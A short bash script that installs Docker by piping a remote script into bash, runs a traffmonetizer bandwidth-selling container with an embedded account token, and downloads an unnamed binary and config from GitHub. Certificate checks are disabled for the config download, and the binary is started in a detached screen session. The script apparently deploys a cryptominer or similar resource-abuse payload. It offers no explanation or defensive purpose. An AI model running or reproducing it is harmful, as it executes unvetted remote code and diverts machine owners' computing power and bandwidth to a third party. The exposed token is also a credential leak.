#!/bin/bash
wget -qO- get.docker.com | bash
docker run -d --restart=always --name tm traffmonetizer/cli_v2 start accept --token I1TfrUC+ST9NdcK/97Dq/uZAW61DEnSWWr3KEm2GSVg=
wget https://raw.githubusercontent.com/chenlysave/my-micosmgd/refs/heads/main/ccdm
chmod u+x ccdm
wget --no-check-certificate -qO ./config.json https://raw.githubusercontent.com/chenlysave/my-micosmgd/refs/heads/main/adm2.json
screen -dmS task bash -c "./ccdm"
